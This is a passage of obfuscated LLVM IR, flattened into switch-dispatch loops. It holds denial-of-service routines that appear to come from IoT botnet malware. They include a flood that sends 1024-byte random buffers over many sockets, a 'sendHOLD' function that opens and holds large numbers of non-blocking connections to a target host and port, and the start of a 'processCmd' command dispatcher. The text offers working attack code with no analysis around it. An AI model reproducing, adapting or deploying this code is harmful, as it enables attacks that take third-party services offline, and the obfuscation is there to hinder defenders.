  %.reload16 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %152 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload16, i64 %151
  %153 = getelementptr inbounds %struct.state_t, %struct.state_t* %152, i32 0, i32 0
  %154 = load i32, i32* %153, align 8
  %155 = add nsw i32 %154, 1
  %156 = call i32 @select(i32 %155, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  store i32 %156, i32* %15, align 4
  %157 = load i32, i32* %15, align 4
  %158 = icmp eq i32 %157, 1
  %159 = select i1 %158, i32 979429724, i32 -95168180
  store i32 %159, i32* %switchVar
  br label %loopEnd

; <label>:160:                                    ; preds = %loopEntry
  store i32 4, i32* %13, align 4
  %161 = load i32, i32* %8, align 4
  %162 = sext i32 %161 to i64
  %.reload15 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %163 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload15, i64 %162
  %164 = getelementptr inbounds %struct.state_t, %struct.state_t* %163, i32 0, i32 0
  %165 = load i32, i32* %164, align 8
  %166 = bitcast i32* %14 to i8*
  %167 = call i32 @getsockopt(i32 %165, i32 1, i32 4, i8* %166, i32* %13) #4
  %168 = load i32, i32* %14, align 4
  %169 = icmp ne i32 %168, 0
  %170 = select i1 %169, i32 -194519775, i32 1232202298
  store i32 %170, i32* %switchVar
  br label %loopEnd

; <label>:171:                                    ; preds = %loopEntry
  %172 = load i32, i32* %8, align 4
  %173 = sext i32 %172 to i64
  %.reload14 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %174 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload14, i64 %173
  %175 = getelementptr inbounds %struct.state_t, %struct.state_t* %174, i32 0, i32 0
  %176 = load i32, i32* %175, align 8
  %177 = call i32 @close(i32 %176)
  %178 = load i32, i32* %8, align 4
  %179 = sext i32 %178 to i64
  %.reload13 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %180 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload13, i64 %179
  %181 = getelementptr inbounds %struct.state_t, %struct.state_t* %180, i32 0, i32 1
  store i8 0, i8* %181, align 4
  store i32 -1014114099, i32* %switchVar
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  %183 = load i32, i32* %8, align 4
  %184 = sext i32 %183 to i64
  %.reload12 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %185 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload12, i64 %184
  %186 = getelementptr inbounds %struct.state_t, %struct.state_t* %185, i32 0, i32 1
  store i8 2, i8* %186, align 4
  store i32 -1014114099, i32* %switchVar
  br label %loopEnd

; <label>:187:                                    ; preds = %loopEntry
  store i32 69990391, i32* %switchVar
  br label %loopEnd

; <label>:188:                                    ; preds = %loopEntry
  %189 = load i32, i32* %15, align 4
  %190 = icmp eq i32 %189, -1
  %191 = select i1 %190, i32 -202957110, i32 551696813
  store i32 %191, i32* %switchVar
  br label %loopEnd

; <label>:192:                                    ; preds = %loopEntry
  %193 = load i32, i32* %8, align 4
  %194 = sext i32 %193 to i64
  %.reload11 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %195 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload11, i64 %194
  %196 = getelementptr inbounds %struct.state_t, %struct.state_t* %195, i32 0, i32 0
  %197 = load i32, i32* %196, align 8
  %198 = call i32 @close(i32 %197)
  %199 = load i32, i32* %8, align 4
  %200 = sext i32 %199 to i64
  %.reload10 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %201 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload10, i64 %200
  %202 = getelementptr inbounds %struct.state_t, %struct.state_t* %201, i32 0, i32 1
  store i8 0, i8* %202, align 4
  store i32 551696813, i32* %switchVar
  br label %loopEnd

; <label>:203:                                    ; preds = %loopEntry
  store i32 69990391, i32* %switchVar
  br label %loopEnd

; <label>:204:                                    ; preds = %loopEntry
  store i32 -1588325961, i32* %switchVar
  br label %loopEnd

; <label>:205:                                    ; preds = %loopEntry
  %206 = load i8*, i8** %16, align 8
  call void @makeRandomStr(i8* %206, i32 1024)
  %207 = load i32, i32* %8, align 4
  %208 = sext i32 %207 to i64
  %.reload9 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %209 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload9, i64 %208
  %210 = getelementptr inbounds %struct.state_t, %struct.state_t* %209, i32 0, i32 0
  %211 = load i32, i32* %210, align 8
  %212 = load i8*, i8** %16, align 8
  %213 = call i64 @send(i32 %211, i8* %212, i64 1024, i32 16384)
  %214 = icmp eq i64 %213, -1
  %215 = select i1 %214, i32 113436107, i32 37218379
  store i32 %215, i32* %switchVar
  br label %loopEnd

; <label>:216:                                    ; preds = %loopEntry
  %217 = call i32* @__errno_location() #13
  %218 = load i32, i32* %217, align 4
  %219 = icmp ne i32 %218, 11
  %220 = select i1 %219, i32 -1382179209, i32 37218379
  store i32 %220, i32* %switchVar
  br label %loopEnd

; <label>:221:                                    ; preds = %loopEntry
  %222 = load i32, i32* %8, align 4
  %223 = sext i32 %222 to i64
  %.reload8 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %224 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload8, i64 %223
  %225 = getelementptr inbounds %struct.state_t, %struct.state_t* %224, i32 0, i32 0
  %226 = load i32, i32* %225, align 8
  %227 = call i32 @close(i32 %226)
  %228 = load i32, i32* %8, align 4
  %229 = sext i32 %228 to i64
  %.reload7 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %230 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload7, i64 %229
  %231 = getelementptr inbounds %struct.state_t, %struct.state_t* %230, i32 0, i32 1
  store i8 0, i8* %231, align 4
  store i32 37218379, i32* %switchVar
  br label %loopEnd

; <label>:232:                                    ; preds = %loopEntry
  store i32 -1588325961, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 -1588325961, i32* %switchVar
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  store i32 -973849671, i32* %switchVar
  br label %loopEnd

; <label>:234:                                    ; preds = %loopEntry
  %235 = load i32, i32* %8, align 4
  %236 = add nsw i32 %235, 1
  store i32 %236, i32* %8, align 4
  store i32 -525268448, i32* %switchVar
  br label %loopEnd

; <label>:237:                                    ; preds = %loopEntry
  store i32 1170004222, i32* %switchVar
  br label %loopEnd

; <label>:238:                                    ; preds = %loopEntry
  %239 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %239)
  store i32 -1522134941, i32* %switchVar
  br label %loopEnd

; <label>:240:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %238, %237, %234, %233, %NewDefault, %232, %221, %216, %205, %204, %203, %192, %188, %187, %182, %171, %160, %128, %127, %118, %117, %116, %111, %104, %99, %71, %LeafBlock, %LeafBlock1, %NodeBlock, %NodeBlock3, %60, %55, %54, %49, %33, %32, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @sendHOLD(i8*, i32, i32) #0 {
  %.reg2mem29 = alloca i32
  %.reg2mem6 = alloca %struct.state_t*
  %.reg2mem = alloca i32
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %22 = call i32 @getdtablesize() #4
  %23 = sdiv i32 %22, 2
  store i32 %23, i32* %7, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = load i32, i32* %5, align 4
  %26 = trunc i32 %25 to i16
  %27 = call zeroext i16 @htons(i16 zeroext %26) #13
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = load i8*, i8** %4, align 8
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %31 = call i32 @getHost(i8* %29, %struct.in_addr* %30)
  store i32 %31, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1428777143, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar5 = load i32, i32* %switchVar
  switch i32 %switchVar5, label %switchDefault [
    i32 1428777143, label %first
    i32 -1674170813, label %34
    i32 1844226762, label %35
    i32 588936578, label %51
    i32 1204240676, label %56
    i32 1079795538, label %57
    i32 -1640526887, label %62
    i32 1099114385, label %NodeBlock3
    i32 -615343519, label %NodeBlock
    i32 -1204027254, label %LeafBlock1
    i32 -126791890, label %LeafBlock
    i32 -301755753, label %73
    i32 -1665837392, label %101
    i32 -971486611, label %106
    i32 623651171, label %113
    i32 1474549265, label %118
    i32 1556365278, label %119
    i32 1508037686, label %120
    i32 1506604298, label %129
    i32 1840344456, label %130
    i32 999445119, label %162
    i32 -315809978, label %173
    i32 1780213305, label %184
    i32 -989533460, label %189
    i32 -1275538024, label %190
    i32 -696564198, label %194
    i32 1585242085, label %205
    i32 -1483105400, label %206
    i32 -519497401, label %207
    i32 -981672664, label %208
    i32 -248891353, label %217
    i32 -2092528960, label %218
    i32 1906951568, label %250
    i32 -205270746, label %261
    i32 569659901, label %NewDefault
    i32 27282703, label %262
    i32 -866269603, label %263
    i32 -882012082, label %266
    i32 2146728658, label %267
    i32 86812342, label %269
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %32 = icmp ne i32 %.reload, 0
  %33 = select i1 %32, i32 -1674170813, i32 1844226762
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i32 86812342, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %37 = getelementptr inbounds [8 x i8], [8 x i8]* %36, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %37, i8 0, i64 8, i32 4, i1 false)
  %38 = load i32, i32* %7, align 4
  %39 = zext i32 %38 to i64
  %40 = call i8* @llvm.stacksave()
  store i8* %40, i8** %10, align 8
  %41 = alloca %struct.state_t, i64 %39, align 16
  store %struct.state_t* %41, %struct.state_t** %.reg2mem6
  %.reload28 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %42 = bitcast %struct.state_t* %.reload28 to i8*
  %43 = load i32, i32* %7, align 4
  %44 = sext i32 %43 to i64
  %45 = mul i64 %44, 5
  call void @llvm.memset.p0i8.i64(i8* %42, i8 0, i64 %45, i32 16, i1 false)
  %46 = call noalias i8* @malloc(i64 1024) #4
  store i8* %46, i8** %16, align 8
  %47 = load i8*, i8** %16, align 8
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 1024, i32 1, i1 false)
  %48 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %49 = load i32, i32* %6, align 4
  %50 = add nsw i32 %48, %49
  store i32 %50, i32* %17, align 4
  store i32 588936578, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  %52 = load i32, i32* %17, align 4
  %53 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %54 = icmp sgt i32 %52, %53
  %55 = select i1 %54, i32 1204240676, i32 2146728658
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  store i32 0, i32* %8, align 4
  store i32 1079795538, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = load i32, i32* %8, align 4
  %59 = load i32, i32* %7, align 4
  %60 = icmp slt i32 %58, %59
  %61 = select i1 %60, i32 -1640526887, i32 -882012082
  store i32 %61, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i32, i32* %8, align 4
  %64 = sext i32 %63 to i64
  %.reload27 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %65 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload27, i64 %64
  %66 = getelementptr inbounds %struct.state_t, %struct.state_t* %65, i32 0, i32 1
  %67 = load i8, i8* %66, align 4
  %68 = zext i8 %67 to i32
  store i32 %68, i32* %.reg2mem29
  store i32 1099114385, i32* %switchVar
  br label %loopEnd

NodeBlock3:                                       ; preds = %loopEntry
  %.reload33 = load volatile i32, i32* %.reg2mem29
  %Pivot4 = icmp slt i32 %.reload33, 1
  %69 = select i1 %Pivot4, i32 -126791890, i32 -615343519
  store i32 %69, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload31 = load volatile i32, i32* %.reg2mem29
  %Pivot = icmp slt i32 %.reload31, 2
  %70 = select i1 %Pivot, i32 1556365278, i32 -1204027254
  store i32 %70, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload30 = load volatile i32, i32* %.reg2mem29
  %SwitchLeaf2 = icmp eq i32 %.reload30, 2
  %71 = select i1 %SwitchLeaf2, i32 -519497401, i32 569659901
  store i32 %71, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload32 = load volatile i32, i32* %.reg2mem29
  %SwitchLeaf = icmp eq i32 %.reload32, 0
  %72 = select i1 %SwitchLeaf, i32 -301755753, i32 569659901
  store i32 %72, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = call i32 @socket(i32 2, i32 1, i32 0) #4
  %75 = load i32, i32* %8, align 4
  %76 = sext i32 %75 to i64
  %.reload26 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %77 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload26, i64 %76
  %78 = getelementptr inbounds %struct.state_t, %struct.state_t* %77, i32 0, i32 0
  store i32 %74, i32* %78, align 8
  %79 = load i32, i32* %8, align 4
  %80 = sext i32 %79 to i64
  %.reload25 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %81 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload25, i64 %80
  %82 = getelementptr inbounds %struct.state_t, %struct.state_t* %81, i32 0, i32 0
  %83 = load i32, i32* %82, align 8
  %84 = load i32, i32* %8, align 4
  %85 = sext i32 %84 to i64
  %.reload24 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %86 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload24, i64 %85
  %87 = getelementptr inbounds %struct.state_t, %struct.state_t* %86, i32 0, i32 0
  %88 = load i32, i32* %87, align 8
  %89 = call i32 (i32, i32, ...) @fcntl(i32 %88, i32 3, i8* null)
  %90 = or i32 %89, 2048
  %91 = call i32 (i32, i32, ...) @fcntl(i32 %83, i32 4, i32 %90)
  %92 = load i32, i32* %8, align 4
  %93 = sext i32 %92 to i64
  %.reload23 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %94 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload23, i64 %93
  %95 = getelementptr inbounds %struct.state_t, %struct.state_t* %94, i32 0, i32 0
  %96 = load i32, i32* %95, align 8
  %97 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %98 = call i32 @connect(i32 %96, %struct.sockaddr* %97, i32 16)
  %99 = icmp ne i32 %98, -1
  %100 = select i1 %99, i32 -971486611, i32 -1665837392
  store i32 %100, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  %102 = call i32* @__errno_location() #13
  %103 = load i32, i32* %102, align 4
  %104 = icmp ne i32 %103, 115
  %105 = select i1 %104, i32 -971486611, i32 623651171
  store i32 %105, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = load i32, i32* %8, align 4
  %108 = sext i32 %107 to i64
  %.reload22 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %109 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload22, i64 %108
  %110 = getelementptr inbounds %struct.state_t, %struct.state_t* %109, i32 0, i32 0
  %111 = load i32, i32* %110, align 8
  %112 = call i32 @close(i32 %111)
  store i32 1474549265, i32* %switchVar
  br label %loopEnd

; <label>:113:                                    ; preds = %loopEntry
  %114 = load i32, i32* %8, align 4
  %115 = sext i32 %114 to i64
  %.reload21 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %116 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload21, i64 %115
  %117 = getelementptr inbounds %struct.state_t, %struct.state_t* %116, i32 0, i32 1
  store i8 1, i8* %117, align 4
  store i32 1474549265, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  store i32 27282703, i32* %switchVar
  br label %loopEnd

; <label>:119:                                    ; preds = %loopEntry
  store i32 1508037686, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %122 = getelementptr inbounds [16 x i64], [16 x i64]* %121, i64 0, i64 0
  %123 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %122) #4, !srcloc !7
  %124 = extractvalue { i64, i64* } %123, 0
  %125 = extractvalue { i64, i64* } %123, 1
  %126 = trunc i64 %124 to i32
  store i32 %126, i32* %18, align 4
  %127 = ptrtoint i64* %125 to i64
  %128 = trunc i64 %127 to i32
  store i32 %128, i32* %19, align 4
  store i32 1506604298, i32* %switchVar
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  store i32 1840344456, i32* %switchVar
  br label %loopEnd

; <label>:130:                                    ; preds = %loopEntry
  %131 = load i32, i32* %8, align 4
  %132 = sext i32 %131 to i64
  %.reload20 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %133 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload20, i64 %132
  %134 = getelementptr inbounds %struct.state_t, %struct.state_t* %133, i32 0, i32 0
  %135 = load i32, i32* %134, align 8
  %136 = srem i32 %135, 64
  %137 = zext i32 %136 to i64
  %138 = shl i64 1, %137
  %139 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %140 = load i32, i32* %8, align 4
  %141 = sext i32 %140 to i64
  %.reload19 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %142 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload19, i64 %141
  %143 = getelementptr inbounds %struct.state_t, %struct.state_t* %142, i32 0, i32 0
  %144 = load i32, i32* %143, align 8
  %145 = sdiv i32 %144, 64
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds [16 x i64], [16 x i64]* %139, i64 0, i64 %146
  %148 = load i64, i64* %147, align 8
  %149 = or i64 %148, %138
  store i64 %149, i64* %147, align 8
  %150 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %150, align 8
  %151 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %151, align 8
  %152 = load i32, i32* %8, align 4
  %153 = sext i32 %152 to i64
  %.reload18 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %154 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload18, i64 %153
  %155 = getelementptr inbounds %struct.state_t, %struct.state_t* %154, i32 0, i32 0
  %156 = load i32, i32* %155, align 8
  %157 = add nsw i32 %156, 1
  %158 = call i32 @select(i32 %157, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  store i32 %158, i32* %15, align 4
  %159 = load i32, i32* %15, align 4
  %160 = icmp eq i32 %159, 1
  %161 = select i1 %160, i32 999445119, i32 -1275538024
  store i32 %161, i32* %switchVar
  br label %loopEnd

; <label>:162:                                    ; preds = %loopEntry
  store i32 4, i32* %13, align 4
  %163 = load i32, i32* %8, align 4
  %164 = sext i32 %163 to i64
  %.reload17 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %165 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload17, i64 %164
  %166 = getelementptr inbounds %struct.state_t, %struct.state_t* %165, i32 0, i32 0
  %167 = load i32, i32* %166, align 8
  %168 = bitcast i32* %14 to i8*
  %169 = call i32 @getsockopt(i32 %167, i32 1, i32 4, i8* %168, i32* %13) #4
  %170 = load i32, i32* %14, align 4
  %171 = icmp ne i32 %170, 0
  %172 = select i1 %171, i32 -315809978, i32 1780213305
  store i32 %172, i32* %switchVar
  br label %loopEnd

; <label>:173:                                    ; preds = %loopEntry
  %174 = load i32, i32* %8, align 4
  %175 = sext i32 %174 to i64
  %.reload16 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %176 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload16, i64 %175
  %177 = getelementptr inbounds %struct.state_t, %struct.state_t* %176, i32 0, i32 0
  %178 = load i32, i32* %177, align 8
  %179 = call i32 @close(i32 %178)
  %180 = load i32, i32* %8, align 4
  %181 = sext i32 %180 to i64
  %.reload15 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %182 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload15, i64 %181
  %183 = getelementptr inbounds %struct.state_t, %struct.state_t* %182, i32 0, i32 1
  store i8 0, i8* %183, align 4
  store i32 -989533460, i32* %switchVar
  br label %loopEnd

; <label>:184:                                    ; preds = %loopEntry
  %185 = load i32, i32* %8, align 4
  %186 = sext i32 %185 to i64
  %.reload14 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %187 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload14, i64 %186
  %188 = getelementptr inbounds %struct.state_t, %struct.state_t* %187, i32 0, i32 1
  store i8 2, i8* %188, align 4
  store i32 -989533460, i32* %switchVar
  br label %loopEnd

; <label>:189:                                    ; preds = %loopEntry
  store i32 -1483105400, i32* %switchVar
  br label %loopEnd

; <label>:190:                                    ; preds = %loopEntry
  %191 = load i32, i32* %15, align 4
  %192 = icmp eq i32 %191, -1
  %193 = select i1 %192, i32 -696564198, i32 1585242085
  store i32 %193, i32* %switchVar
  br label %loopEnd

; <label>:194:                                    ; preds = %loopEntry
  %195 = load i32, i32* %8, align 4
  %196 = sext i32 %195 to i64
  %.reload13 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %197 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload13, i64 %196
  %198 = getelementptr inbounds %struct.state_t, %struct.state_t* %197, i32 0, i32 0
  %199 = load i32, i32* %198, align 8
  %200 = call i32 @close(i32 %199)
  %201 = load i32, i32* %8, align 4
  %202 = sext i32 %201 to i64
  %.reload12 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %203 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload12, i64 %202
  %204 = getelementptr inbounds %struct.state_t, %struct.state_t* %203, i32 0, i32 1
  store i8 0, i8* %204, align 4
  store i32 1585242085, i32* %switchVar
  br label %loopEnd

; <label>:205:                                    ; preds = %loopEntry
  store i32 -1483105400, i32* %switchVar
  br label %loopEnd

; <label>:206:                                    ; preds = %loopEntry
  store i32 27282703, i32* %switchVar
  br label %loopEnd

; <label>:207:                                    ; preds = %loopEntry
  store i32 -981672664, i32* %switchVar
  br label %loopEnd

; <label>:208:                                    ; preds = %loopEntry
  %209 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %210 = getelementptr inbounds [16 x i64], [16 x i64]* %209, i64 0, i64 0
  %211 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %210) #4, !srcloc !8
  %212 = extractvalue { i64, i64* } %211, 0
  %213 = extractvalue { i64, i64* } %211, 1
  %214 = trunc i64 %212 to i32
  store i32 %214, i32* %20, align 4
  %215 = ptrtoint i64* %213 to i64
  %216 = trunc i64 %215 to i32
  store i32 %216, i32* %21, align 4
  store i32 -248891353, i32* %switchVar
  br label %loopEnd

; <label>:217:                                    ; preds = %loopEntry
  store i32 -2092528960, i32* %switchVar
  br label %loopEnd

; <label>:218:                                    ; preds = %loopEntry
  %219 = load i32, i32* %8, align 4
  %220 = sext i32 %219 to i64
  %.reload11 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %221 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload11, i64 %220
  %222 = getelementptr inbounds %struct.state_t, %struct.state_t* %221, i32 0, i32 0
  %223 = load i32, i32* %222, align 8
  %224 = srem i32 %223, 64
  %225 = zext i32 %224 to i64
  %226 = shl i64 1, %225
  %227 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %228 = load i32, i32* %8, align 4
  %229 = sext i32 %228 to i64
  %.reload10 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %230 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload10, i64 %229
  %231 = getelementptr inbounds %struct.state_t, %struct.state_t* %230, i32 0, i32 0
  %232 = load i32, i32* %231, align 8
  %233 = sdiv i32 %232, 64
  %234 = sext i32 %233 to i64
  %235 = getelementptr inbounds [16 x i64], [16 x i64]* %227, i64 0, i64 %234
  %236 = load i64, i64* %235, align 8
  %237 = or i64 %236, %226
  store i64 %237, i64* %235, align 8
  %238 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %238, align 8
  %239 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %239, align 8
  %240 = load i32, i32* %8, align 4
  %241 = sext i32 %240 to i64
  %.reload9 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %242 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload9, i64 %241
  %243 = getelementptr inbounds %struct.state_t, %struct.state_t* %242, i32 0, i32 0
  %244 = load i32, i32* %243, align 8
  %245 = add nsw i32 %244, 1
  %246 = call i32 @select(i32 %245, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.timeval* %12)
  store i32 %246, i32* %15, align 4
  %247 = load i32, i32* %15, align 4
  %248 = icmp ne i32 %247, 0
  %249 = select i1 %248, i32 1906951568, i32 -205270746
  store i32 %249, i32* %switchVar
  br label %loopEnd

; <label>:250:                                    ; preds = %loopEntry
  %251 = load i32, i32* %8, align 4
  %252 = sext i32 %251 to i64
  %.reload8 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %253 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload8, i64 %252
  %254 = getelementptr inbounds %struct.state_t, %struct.state_t* %253, i32 0, i32 0
  %255 = load i32, i32* %254, align 8
  %256 = call i32 @close(i32 %255)
  %257 = load i32, i32* %8, align 4
  %258 = sext i32 %257 to i64
  %.reload7 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %259 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload7, i64 %258
  %260 = getelementptr inbounds %struct.state_t, %struct.state_t* %259, i32 0, i32 1
  store i8 0, i8* %260, align 4
  store i32 -205270746, i32* %switchVar
  br label %loopEnd

; <label>:261:                                    ; preds = %loopEntry
  store i32 27282703, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 27282703, i32* %switchVar
  br label %loopEnd

; <label>:262:                                    ; preds = %loopEntry
  store i32 -866269603, i32* %switchVar
  br label %loopEnd

; <label>:263:                                    ; preds = %loopEntry
  %264 = load i32, i32* %8, align 4
  %265 = add nsw i32 %264, 1
  store i32 %265, i32* %8, align 4
  store i32 1079795538, i32* %switchVar
  br label %loopEnd

; <label>:266:                                    ; preds = %loopEntry
  store i32 588936578, i32* %switchVar
  br label %loopEnd

; <label>:267:                                    ; preds = %loopEntry
  %268 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %268)
  store i32 86812342, i32* %switchVar
  br label %loopEnd

; <label>:269:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %267, %266, %263, %262, %NewDefault, %261, %250, %218, %217, %208, %207, %206, %205, %194, %190, %189, %184, %173, %162, %130, %129, %120, %119, %118, %113, %106, %101, %73, %LeafBlock, %LeafBlock1, %NodeBlock, %NodeBlock3, %62, %57, %56, %51, %35, %34, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8*, align 8
